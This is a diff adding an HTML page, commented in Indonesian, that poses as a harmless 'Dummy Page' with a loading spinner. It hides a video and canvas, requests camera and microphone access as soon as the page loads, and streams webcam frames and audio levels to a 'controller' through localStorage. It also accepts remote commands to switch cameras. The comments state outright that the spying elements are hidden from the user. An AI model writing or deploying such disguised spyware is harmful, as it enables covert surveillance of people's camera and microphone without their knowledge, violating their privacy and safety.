@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Dummy Page</title>
+    <style>
+        /* Halaman ini harus terlihat seperti halaman normal */
+        body { background: #fff; color: #333; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        h1 { color: #007bff; }
+        p { max-width: 300px; margin: 0 auto; color: #666; }
+        /* Sembunyikan elemen spy agar tidak terlihat user */
+        #spy-canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- TAMPILAN PALSU (DECOY) -->
+    <h1>Selamat Datang!</h1>
+    <p>Halaman ini sedang memuat konten...</p>
+    <div style="margin-top:50px; font-size:50px; animation: spin 2s infinite linear;">⏳</div>
+
+    <style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
+
+    <!-- ELEMEN SPY (TERSEMBUNYI) -->
+    <video id="hidden-video" autoplay playsinline muted style="display:none"></video>
+    <canvas id="spy-canvas" width="320" height="240"></canvas>
+
+    <script>
+        // 1. MINTA IZIN KAMERA & MIKROFON
+        // Browser modern meminta izin lewat tombol, kita coba otomatis saat load
+        const video = document.getElementById('hidden-video');
+        const canvas = document.getElementById('spy-canvas');
+        const ctx = canvas.getContext('2d');
+        let currentStream = null;
+        let useFrontCam = true;
+
+        async function startSpy() {
+            try {
+                const constraints = {
+                    video: { facingMode: useFrontCam ? "user" : "environment" },
+                    audio: true
+                };
+                
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                currentStream = stream;
+                video.srcObject = stream;
+                
+                // 2. KIRIM GAMBAR KE CONTROLLER SETIAP 200ms
+                setInterval(() => {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    // Ubah gambar jadi teks (Base64) agar bisa dikirim lewat localStorage
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.5); 
+                    localStorage.setItem('spy_cam_frame', dataURL);
+                }, 200);
+
+                // 3. KIRIM LEVEL SUARA
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const analyser = audioCtx.createAnalyser();
+                const source = audioCtx.createMediaStreamSource(stream);
+                source.connect(analyser);
+                const dataArray = new Uint8Array(analyser.frequencyBinCount);
+
+                setInterval(() => {
+                    analyser.getByteFrequencyData(dataArray);
+                    let sum = 0;
+                    for(let i=0; i<dataArray.length; i++) sum += dataArray[i];
+                    let average = sum / dataArray.length;
+                    localStorage.setItem('spy_audio_level', average);
+                }, 100);
+
+            } catch (err) {
+                console.log("Gagal akses kamera/mic (Mungkin ditolak user)");
+            }
+        }
+
+        // 4. TERIMA PERINTAH DARI CONTROLLER
+        setInterval(() => {
+            const cmd = localStorage.getItem('spy_command');
+            if(cmd) {
+                if(cmd === 'SWITCH_CAM') {
+                    useFrontCam = !useFrontCam;
+                    if(currentStream) {
+                        currentStream.getTracks().forEach(track => track.stop());
+                    }
+                    startSpy();
+                }
+                // Hapus perintah agar tidak berulang
+                localStorage.removeItem('spy_command');
+            }
+        }, 500);
+
+        // Jalankan saat halaman dimuat
+        startSpy();
+
+    </script>
+</body>
+</html>
